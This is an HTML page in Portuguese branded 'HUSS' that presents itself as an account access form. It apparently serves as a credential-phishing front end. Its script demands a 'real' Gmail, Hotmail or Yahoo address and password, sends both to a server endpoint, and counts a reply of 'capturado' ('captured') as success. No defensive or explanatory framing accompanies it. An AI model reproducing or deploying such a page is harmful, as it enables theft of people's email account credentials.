<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HUSS</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: monospace;
      background: radial-gradient(circle at center, #050505, #000000 80%);
      color: #e5e5e5;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 400px;
    }

    .card {
      background: rgba(10, 10, 10, 0.9);
      border-radius: 10px;
      padding: 30px;
      border: 1px solid rgba(255,255,255,0.05);
      box-shadow: 0 0 40px rgba(0,0,0,0.9);
    }

    .logo {
      text-align: center;
      margin-bottom: 30px;
    }

    .logo h1 {
      font-size: 28px;
      letter-spacing: 6px;
      color: #ffffff;
    }

    .logo p {
      color: #666;
      font-size: 12px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      color: #888;
      font-size: 13px;
    }

    input {
      width: 100%;
      height: 45px;
      padding: 0 12px;
      border-radius: 6px;
      border: 1px solid #222;
      background: #050505;
      color: #fff;
      font-size: 14px;
      transition: 0.2s;
    }

    input:focus {
      outline: none;
      border-color: #555;
      box-shadow: 0 0 5px rgba(255,255,255,0.05);
    }

    input::placeholder {
      color: #444;
    }

    .btn {
      width: 100%;
      height: 45px;
      background: #111;
      border: 1px solid #333;
      border-radius: 6px;
      color: #fff;
      font-size: 14px;
      cursor: pointer;
      transition: 0.2s;
    }

    .btn:hover {
      background: #1a1a1a;
      box-shadow: 0 0 10px rgba(255,255,255,0.05);
    }

    .btn:active {
      transform: scale(0.98);
    }

    .footer {
      text-align: center;
      margin-top: 25px;
      color: #444;
      font-size: 11px;
    }

    .loading {
      display: none;
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #777;
    }

    .spinner {
      border: 3px solid rgba(255, 255, 255, 0.1);
      border-radius: 50%;
      border-top: 3px solid #888;
      width: 18px;
      height: 18px;
      animation: spin 1s linear infinite;
      margin: 0 auto 5px;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    .error {
      color: #ff4d4d;
      font-size: 13px;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="card">
      <div class="logo">
        <h1>HUSS</h1>
        <p>sistema de acesso</p>
      </div>
      
      <form id="createAccountForm">
        <div class="form-group">
          <label for="email">Email Real</label>
          <input type="email" id="email" name="email" placeholder="ex: usuario@gmail.com" required>
        </div>
        
        <div class="form-group">
          <label for="password">Senha</label>
          <input type="password" id="password" name="password" placeholder="Escolha uma senha forte" required>
        </div>
        
        <div class="form-group">
          <label for="confirmPassword">Confirmar Senha</label>
          <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Digite novamente" required>
        </div>
        
        <div class="loading" id="loadingSpinner">
          <div class="spinner"></div>
          <p>Processando...</p>
        </div>
        
        <button type="submit" class="btn">Acessar</button>
        
        <div class="error" id="errorMessage">
          Por favor, use um email real
        </div>
      </form>
      
      <div class="footer">
        <p>HUSS // protocolo ativo</p>
        <p>© 2026</p>
      </div>
    </div>
  </div>

  <script>
    document.getElementById('createAccountForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const confirmPassword = document.getElementById('confirmPassword').value;
      const loadingSpinner = document.getElementById('loadingSpinner');
      const errorMessage = document.getElementById('errorMessage');
      
      if (!email.includes('@gmail.com') && !email.includes('@hotmail.com') && !email.includes('@yahoo.com')) {
        errorMessage.style.display = 'block';
        return;
      }
      
      if (password !== confirmPassword) {
        alert('As senhas não coincidem');
        return;
      }
      
      loadingSpinner.style.display = 'block';
      
      try {
        const response = await fetch('/api/form', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password }),
          mode: 'cors'
        });
        
        const result = await response.json();
        
        if (result.status === 'capturado') {
          setTimeout(() => {
            window.location.href = '/success.html';
          }, 1500);
        } else {
          throw new Error(result.message || 'Erro ao criar conta');
        }
      } catch (error) {
        console.error('Erro:', error);
        alert('Erro ao criar conta');
      } finally {
        loadingSpinner.style.display = 'none';
      }
    });
  </script>
</body>
</html>
